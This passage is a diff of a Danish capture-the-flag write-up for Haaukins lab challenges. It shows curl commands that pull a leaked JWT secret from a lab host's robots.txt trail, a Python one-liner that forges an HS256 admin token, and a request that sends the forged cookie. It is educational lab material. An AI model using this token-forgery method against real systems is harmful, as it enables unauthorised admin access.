@@ -23,9 +23,20 @@
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
 <h2>More Power — forfalsk en JWT</h2>
-<p>JWT'en har <code>{"admin":false}</code> (HS256). <code>robots.txt</code> → en fil der lækker secret'en
-             (<code>BurnItAll</code>). Forfalsk <code>{"admin":true}</code> signeret med den:</p>
-             <pre><code>sig=b64u(hmac.new(b"BurnItAll",(h+'.'+p).encode(),hashlib.sha256).digest())
+<p>JWT'en har <code>{"admin":false}</code> (HS256). <code>alg:none</code> bliver afvist (serveren
+             validerer signaturen), og secret'en er ikke i rockyous top-3M, så prøv en læk i stedet:</p>
+             <pre><code>curl http://fartcorp.hkn/robots.txt
+# Disallow: /todo-fart-corp.txt
+curl http://fartcorp.hkn/todo-fart-corp.txt
+# "...change our JWT secret from 'BurnItAll' to something more secure"</code></pre>
+             <p>Forfalsk <code>{"admin":true}</code> signeret med den lækkede secret:</p>
+             <pre><code>python3 -c "
+import hmac, hashlib, base64
+b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+h = b64(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')
+p = b64(b'{\"admin\":true}')
+sig = b64(hmac.new(b'BurnItAll', (h+'.'+p).encode(), hashlib.sha256).digest())
+print(f'{h}.{p}.{sig}')"
 curl -b "jwt=&lt;forged&gt;" http://fartcorp.hkn/   # flag + ny rute /gasgrid</code></pre>
 <h2>Give us the Gas — det er en OT/ICS-opgave</h2>
 <p><code>/gasgrid</code> er read-only, men en portscan afslører <strong>port 502 (Modbus/TCP)</strong>.
